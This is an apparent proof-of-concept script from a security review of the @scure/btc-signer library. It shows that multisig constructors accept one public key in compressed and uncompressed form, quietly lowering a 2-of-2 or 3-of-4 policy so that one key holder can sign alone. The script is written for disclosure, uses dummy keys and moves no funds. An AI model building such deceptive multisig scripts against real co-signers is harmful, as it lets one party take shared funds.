// PoC: p2ms/multisig/sortedMultisig accept the same secp256k1 point twice
// (compressed + uncompressed SEC1 encodings), silently weakening an m-of-n
// policy to a lower effective threshold at consensus level.
//
// Reviewed commit: 68b2fad4ef8232302c6239c00902def1f511c974 (@scure/btc-signer 2.2.0)
//
// Setup (once, in the worktree at the pinned commit):
//   npm install && cd test && ../node_modules/.bin/tsc
// Run:
//   REPO=<path-to-worktree> node --experimental-global-webcrypto poc.mjs

import path from 'node:path';
import { pathToFileURL } from 'node:url';

const REPO = process.env.REPO;
if (!REPO) throw new Error('set REPO=<path-to-worktree>');
const src = (f) => pathToFileURL(path.join(REPO, 'test/compiled/src', f)).href;
const nm = (f) => pathToFileURL(path.join(REPO, 'node_modules', f)).href;

const { hex } = await import(nm('@scure/base/index.js'));
const { secp256k1 } = await import(nm('@noble/curves/secp256k1.js'));
const u = await import(src('utils.js'));
const { p2ms, multisig, sortedMultisig, OutScript } = await import(src('payment.js'));

const privA = hex.decode('01'.repeat(32)); // valueless deterministic key
const privB = hex.decode('02'.repeat(32));

const compA = u.pubECDSA(privA, true);    // 33 bytes 02/03 || x
const uncompA = u.pubECDSA(privA, false); // 65 bytes 04 || x || y
const compB = u.pubECDSA(privB, true);

console.log('compA   =', hex.encode(compA));
console.log('uncompA =', hex.encode(uncompA).slice(0, 40) + '...');

// Sanity: both encodings are the same curve point.
const samePoint = secp256k1.Point.fromBytes(compA).equals(secp256k1.Point.fromBytes(uncompA));
console.log('\n[0] compA and uncompA are the same secp256k1 point:', samePoint);

// 1) Exact-byte duplicates are rejected by uniqPubkey (payment.ts:505-514).
let exactRejected = false;
try { p2ms(2, [compA, compA]); } catch (e) { exactRejected = true; console.log('\n[1] p2ms(2, [compA, compA]) throws:', e.message); }
console.log('    exact-byte duplicate rejected:', exactRejected);

// 2) BUG: the same point in compressed + uncompressed form is accepted.
const ms = p2ms(2, [compA, uncompA]); // NO throw
const decoded = OutScript.decode(ms.script);
console.log('\n[2] p2ms(2, [compA, uncompA]) ACCEPTED. script =', hex.encode(ms.script));
console.log('    decoded: type=%s m=%d n=%d', decoded.type, decoded.m, decoded.pubkeys.length);
console.log('    -> displayed policy is 2-of-2, but both positions are controlled by ONE private key');

// 3) Same for the address-producing wrappers (P2SH / P2WSH and BIP67-sorted variant).
const shMs = multisig(2, [compA, uncompA], false, false);
console.log('\n[3] multisig(2, [compA, uncompA], false, false) ACCEPTED. address =', shMs.address);
const sorted = sortedMultisig(2, [compA, uncompA], false);
console.log('    sortedMultisig(2, [compA, uncompA]) ACCEPTED. address =', sorted.address);
console.log('    (also a BIP67 violation: sortedMultisig admits uncompressed keys, payment.ts:1396-1405)');

// 4) Consensus-level demonstration: one signature from privA satisfies BOTH
//    CHECKMULTISIG positions. CHECKMULTISIG matches signatures to pubkeys in
//    order; ECDSA verification is point-based, so sig(privA) verifies against
//    both compA and uncompA. Deterministic RFC6979 => the two signatures are
//    byte-identical, so the witness OP_0 <sig> <sig> spends the "2-of-2" alone.
const sighash = u.sha256(hex.decode('0064656d6f')); // stand-in 32-byte sighash
const sig1 = u.signECDSA(sighash, privA);
const sig2 = u.signECDSA(sighash, privA);
const verifiesAgainstComp = secp256k1.verify(sig1, sighash, compA, { format: 'der', prehash: false });
const verifiesAgainstUncomp = secp256k1.verify(sig1, sighash, uncompA, { format: 'der', prehash: false });
console.log('\n[4] one ECDSA sig from privA verifies against compA:', verifiesAgainstComp);
console.log('    same sig verifies against uncompA (same point):', verifiesAgainstUncomp);
console.log('    deterministic signing => two slots get identical bytes:', hex.encode(sig1) === hex.encode(sig2));
console.log('    => scriptSig OP_0 <sig> <sig> satisfies OP_2 <compA> <uncompA> OP_2 CHECKMULTISIG');
console.log('    => effective consensus policy is 1-of-1, not the authorized 2-of-2');

// 5) Threshold math generalization: 3-of-4 with one duplicated point => holder
//    of A alone covers 2 of the 3 required signature slots.
const privC = hex.decode('03'.repeat(32));
const ms34 = p2ms(3, [compA, uncompA, compB, u.pubECDSA(privC, true)]);
const d34 = OutScript.decode(ms34.script);
console.log('\n[5] p2ms(3, [A, A(65B), B, C]) ACCEPTED as m=%d of n=%d; holder of A alone provides 2 of the 3 required sigs', d34.m, d34.pubkeys.length);

console.log('\nRESULT: policy weakening confirmed at construction level (no funding performed).');
